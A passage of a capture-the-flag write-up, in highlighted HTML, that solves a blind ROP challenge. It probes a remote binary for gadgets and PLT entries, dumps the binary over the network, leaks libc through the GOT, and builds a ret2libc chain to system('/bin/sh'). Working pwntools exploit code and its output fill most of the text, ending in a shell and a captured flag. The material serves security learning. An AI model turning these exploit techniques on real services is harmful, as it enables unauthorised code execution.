            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">find_brop</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">):</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">is_stop</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">, leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="k">break</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">35</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;_ - </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">base</span> <span class="o">+</span> <span class="n">i</span>

<span class="n">find_brop</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
</code></pre></div><p>Which returns:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
_ - 0x0
_ - 0x23
_ - 0x46
_ - 0x69
_ - 0x8c
_ - 0xaf
_ - 0xd2
_ - 0xf5
_ - 0x118
_ - 0x13b
_ - 0x15e
_ - 0x181
_ - 0x1a4
_ - 0x1c7
_ - 0x1ea
_ - 0x20d
_ - 0x230
_ - 0x253
_ - 0x276
_ - 0x299
_ - 0x2bc
_ - 0x2df
_ - 0x302
_ - 0x325
_ - 0x348
_ - 0x36b
_ - 0x38e
_ - 0x3b1
_ - 0x3d4
_ - 0x3f7
_ - 0x41a
_ - 0x43d
_ - 0x460
_ - 0x483
_ - 0x4a6
_ - 0x4c9
_ - 0x4ec
_ - 0x50f
_ - 0x532
_ - 0x555
_ - 0x578
_ - 0x59b
_ - 0x5be
_ - 0x5e1
_ - 0x604
_ - 0x627
_ - 0x64a
_ - 0x66d
_ - 0x690
_ - 0x6b3
_ - 0x6d6
_ - 0x6f9
_ - 0x71c
Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\x07@&gt;&gt;&gt; &#39;</span>, leak: 0x40073a
</code></pre></div><p>Since we got this gadget we can control <code>rdi</code> and <code>rsi</code> because of some misaligned instructions !</p>
<div class="gblog-post__anchorwrap">
    <h3 id="procedure-linkage-table-plt">
        Procedure linkage table (PLT)
        <a data-clipboard-text="https://nasm.re/posts/blindate/#procedure-linkage-table-plt" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Procedure linkage table (PLT)" href="#procedure-linkage-table-plt">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>The next step would be to leak the PLT to see if there is a puts, printf, or write functions.
To find the PLT there is three rules:</p>
<ul>
<li>The addresses of each stub are 16 bytes aligned</li>
<li>If we jmp one time on a candidate we can check it&rsquo;s a PLT entry by jumping at <code>entry+6</code> which is the address of the slowpath jump in the GOT. And so the behaviour should be the same.</li>
<li>We can give arguments like valid pointers in <code>rdi</code> and <code>rsi</code> to identify functions like puts, strcmp etc.</li>
</ul>
<p>I used so a payload&rsquo;s structure like this: <code>padding + POP_RDI + 0x400000 + POP_RSI_R15 + 0x400000 + probe + stop + trap</code>
That&rsquo;s how I developped this function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x9</span>
<span class="n">POP_RSI_R15</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x7</span>

<span class="k">def</span> <span class="nf">unpadd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">is_stop</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">ip</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">STOP_GADGETS</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">find_plt</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span> 
    <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span> 

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">):</span>
        <span class="n">resp1</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span> <span class="c1"># I used the base address because it&#39;s an recognizable pattern</span>

        <span class="k">if</span> <span class="n">is_stop</span><span class="p">(</span><span class="n">resp1</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">, leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

        <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp1</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Out: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</code></pre></div><p>And we got this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
<span class="o">[</span>0x400500<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201010a3e3e3e20
<span class="o">[</span>0x400510<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201013e3e3e20
<span class="o">[</span>0x400520<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
<span class="o">[</span>0x400570<span class="o">]</span> Out: 5468616e6b73204141414141414141414141414141414141414141414141414141414141414141414141414141414143074048656c6c6f20796f752e0a5768617420697320796f7572206e616d65203f0a3e3e3e20
<span class="o">[</span>0x4005d0<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
<span class="o">[</span>0x400610<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
<span class="o">[</span>0x400630<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
<span class="o">[</span>0x400640<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
<span class="o">[</span>0x4006e0<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
<span class="o">[</span>0x400750<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
</code></pre></div><p>Awesome ! We got a leak of the binary in two gadgets !</p>
<div class="gblog-post__anchorwrap">
    <h3 id="leaking-the-binary">
        Leaking the binary
        <a data-clipboard-text="https://nasm.re/posts/blindate/#leaking-the-binary" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leaking the binary" href="#leaking-the-binary">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<p>Since we can leak an arbitrary location it&rsquo;s really easier !
We can see that the patter which leaks is like: <code>Thanks + padding + unpadd(p64(POP_RDI)) + leak_upto_null_byte</code>.
So we can leak all the binary from the base address:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">STOP_GADGETS</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x400668</span><span class="p">]</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x9</span>
<span class="n">POP_RSI_R15</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x7</span>

<span class="k">def</span> <span class="nf">unpadd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">dump_binary</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="n">base</span><span class="p">):</span>
    <span class="n">gadget_leak</span> <span class="o">=</span> <span class="mh">0x400510</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> 
    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>

    <span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>

    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;leet_dump.bin&#34;</span><span class="p">,</span> <span class="s2">&#34;ab&#34;</span><span class="p">)</span>

    <span class="k">while</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x400fff</span><span class="p">:</span> <span class="c1"># guessed end to the binary .text</span>
        <span class="n">resp1</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget_leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp1</span><span class="p">):</span> <span class="c1"># somtimes there is no repsonse</span>
            <span class="k">continue</span>

        <span class="n">leak</span> <span class="o">=</span> <span class="n">resp1</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">pattern</span><span class="p">):</span><span class="n">resp1</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)]</span> <span class="c1"># get the leaked part</span>
        
        <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">):</span> <span class="c1"># if no leak it means it&#39;s a null byte</span>
            <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">: 0x00&#34;</span><span class="p">)</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span> <span class="c1"># else we got raw data leaked</span>
            <span class="n">buf</span> <span class="o">+=</span> <span class="n">leak</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">leak</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

            <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>

        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mh">0x100</span><span class="p">:</span> <span class="c1"># we write bytes to the file each 0x100 bytes</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
            <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Buffering ..&#34;</span><span class="p">)</span>
</code></pre></div><p>Because of my connection I have to relaunch the script with a different base address to dump the whole binary but anyway, it works !</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
<span class="o">[</span>skip<span class="o">]</span>
<span class="o">[</span>*<span class="o">]</span> recv @ 0x400fff: 0x00
STOP: &lt;class <span class="s1">&#39;KeyboardInterrupt&#39;</span>&gt;
$ ./solve.py
</code></pre></div><p>Since we dumped the binary we just need to build a classic ropchain by leaking the address of <code>FFLUSH</code> in the GOT and then compute the base address of the libc. It&rsquo;s interesting to see that we don&rsquo;t know what libc it is. So we can use <a
  class="gblog-markdown__link"
  href="https://libc.blukat.me/"
  
  >this</a
> to find from the offset of fflush and read, the right version. Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">__libc_start_main 	0x021a50 	0x0
system 	0x041490 	0x1fa40
fflush 	0x069ab0 	0x48060
open 	0x0db950 	0xb9f00
<span class="nb">read</span> 	0x0dbb90 	0xba140
write 	0x0dbbf0 	0xba1a0
str_bin_sh 	0x1633e8 	0x141998
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="put-everything-together">
        Put everything together
        <a data-clipboard-text="https://nasm.re/posts/blindate/#put-everything-together" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Put everything together" href="#put-everything-together">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>I&rsquo;ll no detail a lot the final part because it&rsquo;s a basic rop payload. But since we got the right gadgets from the leaked binary, it&rsquo;s very easy. We have to notice that this exploit is not 100% reiable, if the address of FFLUSH in the GOT has a NULL byte the exploit will not work. Here is the final function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">STOP_GADGETS</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x400668</span><span class="p">]</span>

<span class="n">CSU_POP</span> <span class="o">=</span> <span class="mh">0x40073a</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x9</span>
<span class="n">POP_RSI_R15</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x7</span>

<span class="n">GADGET_LEAK</span> <span class="o">=</span> <span class="mh">0x400510</span>
<span class="n">FFLUSH_GOT</span> <span class="o">=</span> <span class="mh">0x400000</span> <span class="o">+</span> <span class="mh">0x200FF0</span>
<span class="n">FFLUSH_OFFSET</span> <span class="o">=</span> <span class="mh">0x069ab0</span>
<span class="n">OFFT_BINSH</span> <span class="o">=</span> <span class="mh">0x1633e8</span>

<span class="n">SYSTEM</span> <span class="o">=</span> <span class="mh">0x041490</span>

<span class="k">def</span> <span class="nf">try_jmp_flow</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span><span class="p">,</span> <span class="n">io</span>

<span class="k">def</span> <span class="nf">flow</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">FFLUSH_GOT</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">GADGET_LEAK</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span> <span class="o">+</span> <span class="mh">0x656</span><span class="p">)</span> <span class="c1"># ret2main</span>

    <span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
    <span class="n">resp_tmp</span><span class="p">,</span> <span class="n">io</span> <span class="o">=</span> <span class="n">try_jmp_flow</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">)</span>
    <span class="n">leak_fflush</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">pattern</span><span class="p">):</span><span class="n">resp_tmp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is&#39;</span><span class="p">)],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>

    <span class="n">libc</span> <span class="o">=</span> <span class="n">leak_fflush</span> <span class="o">-</span> <span class="n">FFLUSH_OFFSET</span> 
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">OFFT_BINSH</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">SYSTEM</span><span class="p">)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="n">flow</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
</code></pre></div><p>And when we run it, we got a shell yeeeeeah !</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
b<span class="s1">&#39;Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC\x07@\xb0J\xa2\xd7&lt;\x7fWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
libc @ 0x7f3cd79bb000
$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span>
$ cat flag
FCSC<span class="o">{</span>3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28<span class="o">}</span>
</code></pre></div><p>Here is the final script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">STOP_GADGETS</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x400668</span><span class="p">]</span>

<span class="n">CSU_POP</span> <span class="o">=</span> <span class="mh">0x40073a</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x9</span>
<span class="n">POP_RSI_R15</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x7</span>

<span class="n">GADGET_LEAK</span> <span class="o">=</span> <span class="mh">0x400510</span>
<span class="n">FFLUSH_GOT</span> <span class="o">=</span> <span class="mh">0x400000</span> <span class="o">+</span> <span class="mh">0x200FF0</span>
<span class="n">FFLUSH_OFFSET</span> <span class="o">=</span> <span class="mh">0x069ab0</span>
<span class="n">OFFT_BINSH</span> <span class="o">=</span> <span class="mh">0x1633e8</span>

<span class="n">SYSTEM</span> <span class="o">=</span> <span class="mh">0x041490</span> 

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">__libc_start_main 	0x021a50 	0x0
</span><span class="s2">system 	0x041490 	0x1fa40
</span><span class="s2">fflush 	0x069ab0 	0x48060
</span><span class="s2">open 	0x0db950 	0xb9f00
</span><span class="s2">read 	0x0dbb90 	0xba140
</span><span class="s2">write 	0x0dbbf0 	0xba1a0
</span><span class="s2">str_bin_sh 	0x1633e8 	0x141998
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>

